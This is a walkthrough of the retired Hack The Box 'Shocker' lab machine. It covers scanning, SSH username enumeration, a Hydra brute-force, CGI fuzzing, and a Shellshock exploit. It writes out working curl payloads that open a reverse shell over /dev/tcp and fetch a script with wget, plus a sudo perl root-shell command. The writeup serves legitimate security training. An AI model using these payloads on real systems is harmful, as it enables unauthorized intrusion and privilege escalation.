---
title: "Hack The Box \"Shocker\" Writeup"
date: 2023-10-01T00:12:29-04:00
draft: false
---

[Shocker](https://app.hackthebox.com/machines/Shocker) is a
retired easy Linux box by mrb3n. It was released on October
3rd, 2017.

## Scanning

I began by scanning the machine:
```
$ nmap -A -T4 10.10.10.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-30 21:59 EDT
Nmap scan report for 10.10.10.56
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have Apache running on port 80 and OpenSHH on port 2222.

## Enumeration

### Port 2222

I usually start with SSH because if password bruteforcing
seems to be a valid avenue, it's best to start it early.
Let's attempt to connect to the server:

```bash
$ ssh 10.10.10.56 -p 2222
```

We are asked for a password--password authentication is
enabled. Next, let's see if there are any salient
vulnerabilities for this version of OpenSSH, 7.2p2.

```
$ searchsploit openssh 7.2p2
-------------------------------------- -----------------------
 Exploit Title                        |  Path
-------------------------------------- -----------------------
OpenSSH 7.2p2 - Username Enumeration  | linux/remote/40136.py
OpenSSHd 7.2p2 - Username Enumeration | linux/remote/40113.txt
-------------------------------------- -----------------------
```

Sure enough, this version is vulnerable to username
enumeration through a side-channel timing attack when
submitting very long passwords. I downloaded the script, set
up a virtual environment, installed the dependencies, and
monkey-patched `time.clock = time.time` because the former
was deprecated. I ran it multiple times with a small list of
17 usernames--the following is one output:

```
./40136.py -U usernames.txt 10.10.10.56:2222 --samples 64 --trials 32
...
[*] Baseline mean for host 10.10.10.56 is 0.36141190990324945 seconds.
[*] Baseline variation for host 10.10.10.56 is 0.003058627316928219 seconds.
[*] Defining timing of x < 0.3705877918540341 as non-existing user.
[*] Testing your users...
[-] root - timing: 0.3622346520423889
[-] admin - timing: 0.3608233258128166
[-] test - timing: 0.36106352508068085
[-] guest - timing: 0.3625797629356384
[+] info - timing: 0.3719070628285408
[-] adm - timing: 0.36521296203136444
[-] mysql - timing: 0.3658187761902809
[-] user - timing: 0.3619757816195488
[-] administrator - timing: 0.3607597276568413
[-] oracle - timing: 0.3613279387354851
[-] ftp - timing: 0.3622165694832802
[-] pi - timing: 0.36343473941087723
[-] puppet - timing: 0.36332932114601135
[-] ansible - timing: 0.36283544450998306
[-] ec2-user - timing: 0.362905390560627
[-] vagrant - timing: 0.36412063241004944
[-] azureuser - timing: 0.3640487641096115
```

I found the results across iterations to be inconsistent and
unconvincing, though the user `info` was returned
consistently enough for me to run Hydra against the service
with a small password list of the top 1,000 most common
passwords:

```bash
hydra -l info -P 1000-passwords.txt ssh://10.10.10.56:2222 -t 4
```

### Port 80

While Hydra is running, let's check out the website:

![](/images/hack-the-box-shocker-writeup/website.jpg)

This is the only content, and there's nothing interesting in
the source. Let's try directory fuzzing with Gobuster:

```bash
gobuster dir --url http://10.10.10.56/ --wordlist dirb.txt
```

While that was running, I researched vulnerabilities in
version 2.4.18 of Apache. I didn't find anything
particularly relevant for version 2.4.18 but I did find an
interesting [privilege escalation
vulnerability](https://www.exploit-db.com/exploits/46676)
that I might've been able to use later.

Gobuster returned the following:
```
/cgi-bin/      (Status: 403) [Size: 294]
/.hta          (Status: 403) [Size: 290]
/.htaccess     (Status: 403) [Size: 295]
/.htaccess     (Status: 403) [Size: 295]
/.htpasswd     (Status: 403) [Size: 295]
/.htpasswd     (Status: 403) [Size: 295]
/index.html    (Status: 200) [Size: 137]
/server-status (Status: 403) [Size: 299]
/server-status (Status: 403) [Size: 299]
```

Let's run it again on `/cgi-bin/`:
```
$ gobuster dir --url http://10.10.10.56:/cgi-bin/ --wordlist cgibin.txt
...
/user.sh              (Status: 200) [Size: 118]
```

I made my own set of wordlists for `/cgi-bin/` enumeration
which I used for this box because I was dissatisfied with
existing lists. You can get them
[here](https://github.com/sawshep/cgi-bin/enum-wordlists).

Anyways, let's make a request to the script:

```
$ curl http://10.10.10.56:80/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 01:47:41 up 3 min,  0 users,  load average: 0.03, 0.07, 0.03
```

As is self-described, it's a script that runs `uptime`. This
server could possibly be vulnerable to
[Shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271),
an attack that exploits a vulnerability in how Bash
processes environment variables to remotely execute
arbitrary code. That's why I didn't see it when initially
researching vulnerabilities for the web server--it's
technically a vulnerability in Bash.

## Exploitation

Let's see if Shellshock works:
```
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo Vulnerble!'" http://10.10.10.56:80/cgi-bin/user.sh
Vulnerable!
```

Sure enough, we get a response back from the server of the
output of our command! Let's pop a reverse shell. We'll
start by listening on our host:

```bash
ncat -lvnp 4444
```

Then, we'll connect to the listener on the target through
Shellshock. I used Bash's virtual TCP files to connect as
Netcat was not present on the system:

```
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/10.10.14.9/4444 0>&1'" http://10.10.10.56:80/cgi-bin/user.sh
$ whoami
shelly
```

Great! We can get the user flag with `cat
/home/shelly/user.txt`.

## Privilege Escalation

Next, I transferred over the [Linux Smart Enumeration
tool](https://github.com/diego-treitos/linux-smart-enumeration)
Because I only have port 4444 opened on my firewall for Hack
The Box, I had to drop the shell, serve the script on an
HTTP server, and use Shellshock to download it:

```bash
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'wget http://10.10.14.9:4444/lse_cve.sh -O /tmp/lse.sh'" http://10.10.10.56:80/cgi-bin/user.sh
```

After marking it executable and running it, I found some
interesting information:

```
...
[!] sud010 Can we list sudo commands without a password?... yes!
...
[!] ctn210 Is the user a member of any lxc/lxd group?...... yes!
...
```

Being a member of the LXC group allows us to mount the root
filesystem in a container and read files which we do not
normally have the privilege to read. Before proceeding with
that exploit, let's check what we can run with `sudo`:

```
$ sudo -l
...
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Being able to run Perl as `root` with no password is much
easier to exploit than being a member of the LXC group.
Let's open a shell as `root`:

```bash
sudo perl -e 'exec "/bin/sh";'
```

Finally, we can read `/root/root.txt` and pwn the machine
for good.
